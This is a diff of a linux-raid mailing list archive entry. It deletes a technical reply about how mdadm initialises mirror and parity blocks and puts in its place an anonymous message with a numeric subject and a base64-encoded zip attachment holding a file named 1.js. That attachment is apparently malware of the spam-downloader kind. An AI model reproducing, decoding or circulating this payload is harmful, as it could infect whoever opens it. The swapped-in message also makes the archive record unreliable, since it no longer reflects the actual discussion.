@@ -1,54 +1,100 @@
-From: Phil Turmel <philip@turmel.org>
-Subject: Re: [mdadm PATCH] Create: tell udev md device is not ready when first
- created.
-Date: Sat, 6 May 2017 15:50:29 -0400
-Message-ID: <b19a7608-db1f-1fcd-f20f-f606c7851d77@turmel.org>
-References: <149265560315.31004.3851231165281498425.stgit@noble>
- <149265600601.31004.323865505557190368.stgit@noble>
- <dedd27cd-9c2e-f244-d8aa-7a074679d3c6@gmail.com>
- <87mvbasqx6.fsf@notabene.neil.brown.name>
- <40a5fbff-9eef-07b3-fe1b-fb9a888cfb8b@redhat.com>
- <87h919ruj5.fsf@notabene.neil.brown.name>
- <6bd347e1-170c-48e9-1171-09ff143ace83@redhat.com>
- <c5fe5d16-5ca6-94b0-fd5b-0b6009d78bab@gmail.com>
- <2f431da6-0dce-b485-4109-6f8669814430@redhat.com>
- <590DF8FA.4090600@youngman.org.uk>
+From: <een@zmva.hu>
+Subject: 3054
+Date: Sun, 07 May 2017 00:01:46 -0000
+Message-ID: <149411530669.26768.15566598031454938782@vodafonedsl.it>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="9511.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-raid-owner@vger.kernel.org>
-In-Reply-To: <590DF8FA.4090600@youngman.org.uk>
+Content-Disposition: attachment
 Sender: linux-raid-owner@vger.kernel.org
-To: Wols Lists <antlists@youngman.org.uk>, Peter Rajnoha <prajnoha@redhat.com>, Jes Sorensen <jes.sorensen@gmail.com>, NeilBrown <neilb@suse.com>
-Cc: linux-raid@vger.kernel.org, dm-devel@redhat.com
+To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
-On 05/06/2017 12:25 PM, Wols Lists wrote:
-> On 03/05/17 15:13, Peter Rajnoha wrote:
->> There's a difference though - when you're *creating* a completely new
->> device that is an abstraction over existing devices, you (most of the
->> time) expect that new device to be initialized. For those corner cases
->> where people do need to keep the old data, there can be an option to do
->> that.
-> 
-> That's not a corner case. If there's old data that's the NORM. I get
-> what you're after, I'm inclined to agree with you, but the default
-> should be to DO NOTHING.
-
-There's some miscommunication here, it seems.  mdadm does NOT wipe the
-primary device in a mirror during create, nor data blocks in a
-parity-based array's stripes, but it DOES wipe the 2nd and following
-copy of all mirrored blocks, and DOES wipe all parity and Q blocks.
-This behaviour is really important for later consistency when degraded,
-and for parallelizing reads of mirrors.
-
-I think a case can be made for wiping it all during create, for
-consistency with other kernel behaviour.  If you allocate memory for
-userspace, or or create a new file on a filesystem with a specific size,
-linux goes to some length to deliver zeros in both cases.  Arguably, it
-should do so in MD, too.
-
-However, changing the default behaviour would fit Linus' definition of a
-regression, I would think.
-
-Phil
+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
+UEsFBgAAAAABAAEAVgAAANASAAAAAA==
